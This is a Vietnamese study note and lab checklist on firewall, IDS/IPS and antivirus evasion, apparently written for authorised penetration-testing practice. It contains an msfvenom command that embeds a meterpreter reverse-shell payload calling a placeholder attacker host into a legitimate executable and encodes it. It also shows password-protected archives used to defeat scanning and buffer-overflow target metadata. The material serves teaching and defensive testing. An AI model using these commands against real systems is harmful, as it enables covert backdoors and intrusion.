# Firewall and IDS/IPS Evasion

## Tổng quan

Muốn kiểm thử khả năng phòng thủ, trước hết phải hiểu hai lớp bảo vệ chính:

```text
Endpoint Protection
Perimeter Protection
```

## Endpoint Protection

Bảo vệ trực tiếp một host:

- Antivirus
    
- Antimalware
    
- Host firewall
    
- EDR
    
- Host IDS/IPS
    
- Anti-ransomware
    
- Application control
    

Endpoint có thể phát hiện payload khi:

```text
File được ghi xuống disk
→ File được quét
→ Process được chạy
→ Memory/process behavior được theo dõi
→ Network callback được ghi nhận
```

## Perimeter Protection

Bảo vệ ranh giới giữa các vùng mạng:

```text
Internet
   ↓
Firewall / IDS / IPS
   ↓
DMZ
   ↓
Internal Network
```

Ví dụ:

- Network firewall
    
- IDS/IPS
    
- WAF
    
- VPN gateway
    
- Secure web gateway
    
- Email gateway
    
- DNS security
    
- DDoS protection
    

## DMZ

DMZ chứa các public-facing server như:

- Web server
    
- Mail gateway
    
- Public DNS
    
- Reverse proxy
    
- VPN gateway
    

Mức độ tin cậy:

```text
Internet < DMZ < Internal Network
```

DMZ phải được phân đoạn để server public bị compromise không thể truy cập tự do vào internal network.

## Security Policies

Security policy dựa trên hai hành động cơ bản:

```text
Allow
Deny
```

Policy có thể áp dụng cho:

- Network traffic
    
- Applications
    
- Users
    
- Files
    
- Devices
    
- DDoS
    
- Data access
    

## Detection Methods

### Signature-based Detection

So sánh file, packet hoặc behavior với pattern đã biết.

Có thể dựa trên:

- Hash
    
- Byte sequence
    
- String
    
- Network pattern
    
- Decoder stub
    
- Exploit request
    

### Heuristic Detection

Đánh giá đặc điểm đáng ngờ thay vì chỉ tìm một signature cố định.

Ví dụ:

```text
Office → PowerShell → Download → Memory injection
```

### Statistical Anomaly Detection

So sánh hoạt động với baseline bình thường.

Ví dụ:

```text
DNS query rất dài + entropy cao + tần suất lớn
→ Có thể là DNS tunneling
```

### Stateful Protocol Analysis

Kiểm tra traffic có tuân thủ trạng thái và chuẩn protocol hay không.

### SOC Monitoring

Analyst theo dõi SIEM, EDR, firewall, DNS, authentication và network logs để điều tra sự kiện.

## Encoding

Encoder biến đổi shellcode và thêm decoder stub.

Ví dụ:

```text
x86/shikata_ga_nai
```

Encoding có thể hỗ trợ xử lý bad characters nhưng không bảo đảm bypass AV/EDR.

```text
Encode nhiều lần ≠ detection thấp hơn
```

## Encrypted Meterpreter Traffic

Mã hóa che nội dung traffic nhưng không che:

- IP
    
- Port
    
- Timing
    
- Packet size
    
- Beaconing pattern
    
- Process tạo connection
    
- Endpoint behavior
    

```text
Encrypted traffic ≠ invisible traffic
```

## Backdoored Executable

Ý tưởng:

```text
Legitimate executable + Payload
```

MSFVenom options:

```bash
msfvenom \
-p windows/x86/meterpreter_reverse_tcp \
LHOST=<ATTACK_IP> \
LPORT=<PORT> \
-x template.exe \
-k \
-e x86/shikata_ga_nai \
-i 5 \
-a x86 \
--platform windows \
-o output.exe
```

- `-p`: payload
    
- `-x`: executable template
    
- `-k`: cố giữ hành vi gốc
    
- `-e`: encoder
    
- `-i`: encoding iterations
    
- `-a`: architecture
    
- `--platform`: platform
    
- `-o`: output file
    

Việc sửa executable thường làm digital signature không còn hợp lệ và có thể tạo thêm indicator.

## Password-Protected Archives

Archive có password có thể ngăn scanner đọc file bên trong, nhưng thường tạo cảnh báo:

```text
Unable to scan encrypted archive
```

```bash
rar a archive.rar -p file
```

Đổi tên:

```bash
mv archive.rar archive
```

Đổi extension không thay đổi file type thật.

```text
0 AV detections ≠ file an toàn
```

Scanner có thể đơn giản là không giải mã được archive.

## VirusTotal

```bash
msf-virustotal -k <API_KEY> -f <FILE>
```

Không upload:

- Payload của khách hàng
    
- Malware nội bộ
    
- Exploit chưa công bố
    
- File chứa dữ liệu nhạy cảm
    
- Sample cần giữ bí mật
    

File gửi lên VirusTotal có thể được chia sẻ với security vendors.

## Packers

Packer đóng gói executable cùng unpacking stub.

```text
Packed file
→ Unpacking in memory
→ Original code executes
```

Packers có thể dùng hợp pháp hoặc bị malware lạm dụng.

EDR có thể phát hiện:

- High entropy
    
- Self-modifying code
    
- RWX memory
    
- Unpacking behavior
    
- Suspicious process injection
    

## Buffer Overflow Detection

IDS/IPS có thể nhận diện:

- Repeated buffer characters
    
- Known return addresses
    
- NOP sleds
    
- Shellcode decoder stubs
    
- Abnormal packet lengths
    
- Invalid protocol fields
    

Target metadata:

```ruby
'Targets' => [
  [
    'Windows 2000 SP4 English',
    {
      'Ret' => 0x77e14c29,
      'Offset' => 5093
    }
  ]
]
```

- `Ret`: địa chỉ điều khiển execution
    
- `Offset`: số byte tới vị trí ghi đè
    

## NOP Sled

```text
NOP NOP NOP NOP [shellcode]
```

NOP sled là chuỗi instruction dẫn execution tới shellcode, không phải bản thân vùng nhớ chứa payload.

## Ghi nhớ

- Evasion chỉ được thực hiện trong scope đã cho phép.
    
- Encoding không phải encryption.
    
- Encoding không bảo đảm bypass AV.
    
- Mã hóa C2 không che được metadata và endpoint behavior.
    
- Đổi đuôi file không đổi định dạng thật.
    
- Archive có password có thể bị block vì không scan được.
    
- Packers có thể làm file đáng ngờ hơn.
    
- VirusTotal không phù hợp cho payload hoặc dữ liệu cần bảo mật.
    
- Buffer overflow exploit nhằm chiếm control flow; crash chỉ là side effect hoặc exploit thất bại.
---
# Firewall and IDS/IPS Evasion Lab Checklist

## 1. Xác định phạm vi

-  Chỉ thực hành trên HTB, CTF hoặc VM thuộc quyền kiểm soát.
    
-  Xác định kỹ thuật evasion nào được phép.
    
-  Không tắt hoặc làm gián đoạn hệ thống giám sát ngoài phạm vi.
    
-  Không đưa payload hoặc dữ liệu khách hàng lên dịch vụ public.
    

## 2. Vẽ kiến trúc phòng thủ

-  Xác định endpoint protection.
    
-  Xác định perimeter firewall.
    
-  Xác định IDS hay IPS.
    
-  Xác định DMZ.
    
-  Xác định internal network.
    
-  Xác định allowed outbound protocols.
    
-  Xác định nơi có SOC/SIEM logging.
    

Sơ đồ:

```text
Attack Box
   ↓
Firewall / IDS / IPS
   ↓
DMZ Target
   ↓
Internal Firewall
   ↓
Internal Hosts
```

## 3. Xác định loại detection

-  Signature-based.
    
-  Heuristic.
    
-  Statistical anomaly.
    
-  Stateful protocol analysis.
    
-  EDR behavioral detection.
    
-  SOC manual monitoring.
    

## 4. Tạo baseline an toàn

-  Dùng file hoặc binary vô hại để xác minh transfer path.
    
-  Ghi hash trước khi thay đổi:
    

```bash
sha256sum template.exe
```

-  Kiểm tra chữ ký hoặc file type.
    
-  Ghi lại process và network behavior bình thường.
    
-  Lưu log Defender/EDR/Sysmon nếu lab hỗ trợ.
    

## 5. Kiểm tra payload configuration

-  Xác định đúng platform.
    
-  Xác định đúng architecture.
    
-  Xác định staged hay stageless.
    
-  Xác định đúng LHOST.
    
-  Xác định đúng LPORT.
    
-  Không mặc định encoder sẽ giảm detection.
    

Liệt kê payload:

```bash
msfvenom -l payloads
```

Liệt kê encoder:

```bash
msfvenom -l encoders
```

## 6. Kiểm tra template executable

-  Giữ lại bản template gốc.
    
-  Không ghi đè file gốc.
    
-  So sánh hash trước và sau.
    
-  Kiểm tra digital signature.
    
-  Kiểm tra architecture của template.
    
-  Ghi nhận template còn hoạt động hay không.
    
-  Quan sát process tree.
    
-  Quan sát outbound connection.
    
-  Quan sát AV/EDR alert.
    

## 7. Đọc đúng các MSFVenom option

-  `-p`: payload.
    
-  `-x`: executable template.
    
-  `-k`: giữ hành vi template nếu có thể.
    
-  `-e`: encoder.
    
-  `-i`: số lần encode.
    
-  `-a`: architecture.
    
-  `--platform`: platform.
    
-  `-o`: output file.
    
-  Luôn dùng `-p`; không dựa vào positional payload.
    
-  Không dùng `-k` khi không có `-x`.
    
-  Không nghĩ đổi output thành `.js` sẽ tạo JavaScript hợp lệ.
    
-  Chỉ định format với `-f` khi cần output format cụ thể.
    

## 8. Kiểm tra archive

-  Tạo archive trong lab:
    

```bash
rar a test.rar -p testfile
```

-  Kiểm tra file type sau khi xóa extension:
    

```bash
mv test.rar test
file test
```

-  Xác nhận đổi tên không thay đổi magic bytes.
    
-  Theo dõi xem gateway block hay chỉ cảnh báo.
    
-  Theo dõi AV khi file được giải nén.
    
-  Theo dõi EDR khi file được thực thi.
    
-  Không coi “unable to scan” là bypass hoàn chỉnh.
    

## 9. Kiểm tra packer

-  Ghi hash trước và sau khi pack.
    
-  So sánh kích thước file.
    
-  Kiểm tra entropy.
    
-  Quan sát unpacking behavior.
    
-  Kiểm tra memory permissions.
    
-  Quan sát process injection hoặc child process.
    
-  Kiểm tra AV/EDR detection.
    
-  Xác minh chương trình gốc còn hoạt động.
    

## 10. Kiểm tra network visibility

-  Capture traffic bằng Wireshark/tcpdump.
    
-  Xác định traffic có mã hóa không.
    
-  Ghi lại destination IP và port.
    
-  Ghi lại interval giữa các connection.
    
-  Ghi lại packet size.
    
-  Kiểm tra DNS query bất thường.
    
-  Kiểm tra firewall log.
    
-  Kiểm tra IDS/IPS alert.
    

Ví dụ capture:

```bash
sudo tcpdump -i tun0 -nn host <TARGET_IP>
```

## 11. Kiểm tra endpoint visibility

-  Process nào chạy payload?
    
-  Parent process là gì?
    
-  Command line là gì?
    
-  File được tạo ở đâu?
    
-  Registry có thay đổi không?
    
-  Process có tạo network connection không?
    
-  Có memory injection không?
    
-  AV có quarantine file không?
    
-  EDR có kill process không?
    

## 12. Khi nghiên cứu buffer overflow

-  Xác định chính xác target version.
    
-  Xác định architecture.
    
-  Xác định offset.
    
-  Xác định return address.
    
-  Xác định bad characters.
    
-  Kiểm tra ASLR/DEP.
    
-  Không thay đổi buffer ngẫu nhiên trên production.
    
-  Kiểm tra trong debugger/sandbox trước.
    
-  Theo dõi nguy cơ crash service.
    
-  Chuẩn bị phương án recovery.
    

## 13. Ghi nhận kết quả

-  Technique nào bị block?
    
-  Technique nào chỉ tạo alert?
    
-  Endpoint hay network layer phát hiện?
    
-  Alert có đủ context không?
    
-  SOC có phản ứng không?
    
-  Payload có chạy được không?
    
-  Chương trình gốc có tiếp tục chạy không?
    
-  File bị phát hiện khi download, extract hay execute?
    
-  Có false negative hay false positive không?
    

## 14. Cleanup

-  Xóa payload và archive.
    
-  Xóa executable đã chỉnh sửa.
    
-  Dừng handler.
    
-  Đóng session.
    
-  Khôi phục template hoặc snapshot.
    
-  Lưu log và bằng chứng cần thiết.
    
-  Ghi rõ mọi thay đổi đã tạo trên target.